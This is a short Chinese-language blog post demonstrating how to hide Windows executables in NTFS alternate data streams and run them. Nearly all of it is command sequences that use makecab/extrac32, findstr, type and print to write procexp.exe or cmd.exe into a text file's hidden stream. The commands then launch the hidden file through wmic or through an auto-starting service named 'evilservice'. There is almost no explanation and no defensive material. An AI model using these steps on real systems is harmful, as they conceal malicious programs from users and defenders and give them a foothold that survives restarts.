---
title: ADS2 数据流
date: 2018-04-12 21:56:49
tags: windows
categories: windows
---
![enter description here][1]
<!--more-->
## 视频演示：
<div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div>
<script type="text/javascript" src="http://demonsec666.oss-cn-qingdao.aliyuncs.com/cytron.core.js"></script>
<script>
    var ivaInstance = new Iva('ivaLive', {
        appkey: 'By9WGzBIx', //应用标示
        video: 'http://demonsec666.oss-cn-qingdao.aliyuncs.com/ADS2.mp4', //视频
        title: 'test', //视频标题，后台视频管理中的标题
        cover: '' //视频封面，只有在autoplay:false才可生效
    });
</script>
<script src="http://demonsec666.oss-cn-qingdao.aliyuncs.com/lva.js"></script>

``` stylus
echo "empty file" > c:\ADS\file.txt
makecab c:\ADS\procexp.exe c:\ADS\procexp.cab
extrac32 C:\ADS\procexp.cab c:\ADS\file.txt:procexp.exe
wmic process call create '"c:\ADS\file.txt:procexp.exe"'
```



![enter description here][2]



``` stylus
echo "empty file" > c:\ADS\file.txt
findstr /V /L W3AllLov3DonaldTrump c:\ADS\procexp.exe > c:\ADS\file.txt:procexp.exe
wmic process call create '"c:\ADS\file.txt:procexp.exe"'
```





``` stylus
echo "empty file" > c:\ADS\file.txt
type c:\windows\system32\cmd.exe > c:\ADS\file.txt:cmd.exe
sc create evilservice binPath= "\"c:\ADS\file.txt:cmd.exe\" /c echo works > \"c:\ADS\works.txt\"" DisplayName= "evilservice" start= auto
sc start evilservice
```


![enter description here][3]


``` stylus
print /d:c:\Users\demon\1.txt:procexp.exe c:\Users\demon\procexp.exe
wmic process call create '"C:\Users\demon\1.txt:procexp.exe"'
```
https://www.youtube.com/watch?v=nPBcSP8M7KE&feature=youtu.be



 Link:  https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/


  [1]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/313B500D964093319BFFB928C47FB193.jpg
  [2]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/86746AC5B99E0AF97FED1A7D5C35B43E.jpg
  [3]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/508B058DD7C2020EB3B2DB5B0FD6939C.jpg 